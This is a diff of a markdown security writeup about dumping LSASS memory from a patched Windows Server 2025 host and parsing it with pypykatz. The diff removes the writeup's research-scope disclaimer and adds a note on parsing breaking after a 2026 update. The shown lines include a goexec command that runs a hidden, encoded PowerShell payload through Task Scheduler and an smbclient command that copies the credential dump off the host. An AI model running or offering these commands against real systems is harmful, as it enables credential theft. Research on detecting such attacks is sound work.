@@ -8,15 +8,6 @@
 
 ---
 
-## Research Scope
-
-This writeup focuses on detection engineering and Microsoft Defender telemetry behaviour, not tool development.
-The technique is described at the API level using publicly documented Windows functionality. No tooling or compiled binaries are provided.
-No vulnerability or security boundary bypass was identified. This research examines how Defender responds to specific credential access patterns and where visibility diverges from enforcement.
-The goal is to clarify detection boundaries for defenders.
-
-All testing conducted under assumed breach conditions — local admin access on target host is a prerequisite.
-
 ## Objective
 
 Determine whether pypykatz can successfully parse an LSASS minidump exfiltrated from a fully patched Windows Server 2025 host at UBR 1742, with current Defender signatures active and no Credential Guard configured.
@@ -50,7 +41,7 @@ A base64-encoded PowerShell payload was delivered via `goexec` using the Task Sc
 # [Kali]
 ./goexec tsch create 192.168.1.52 \
   -u 'ubuntu' \
-  -p 'xxx****' \
+  -p 'j44****' \
   --task '\systemshell' \
   --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
   --args "-NoP -NonI -W Hidden -Enc $ENCODED"
@@ -62,7 +53,7 @@ The task was configured to self-delete after execution. Dump completed in approx
 
 ```bash
 # [Kali]
-smbclient //192.168.1.52/C$ -U 'ubuntu%xxx****' \
+smbclient //192.168.1.52/C$ -U 'ubuntu%j44****' \
   -c 'get Windows\Temp\out2.dmp /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp'
 ```
 
@@ -283,9 +274,18 @@ None of these individually explain the outcome. Together they describe a behavio
 
 ---
 
+## Parsing Boundary Note
+
+pypykatz parsing confirmed broken on build **26100.32370** (KB5075899, February 10, 2026) — see [skelsec/pypykatz#191](https://github.com/skelsec/pypykatz/issues/191). Reporters observed that dumps could still be created at that patch level, but MSV and Kerberos structure extraction failed with `msv_exception_please_report`. Microsoft appears to have modified internal LSASS data structures or offsets in that cumulative update, breaking pypykatz's parsing templates.
+
+**UBR 1742 (November 2024 GA build) represents the last fully validated baseline prior to this structural change.** This writeup documents that boundary.
+
+---
+
 ## References
 
 - [pypykatz](https://github.com/skelsec/pypykatz)
+- [pypykatz issue #191 — MSV/Kerberos parsing failure on 26100.32370](https://github.com/skelsec/pypykatz/issues/191)
 - [goexec](https://github.com/bachimanchi/goexec)
 - [Microsoft — MiniDumpWriteDump](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)
 - [Microsoft — Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
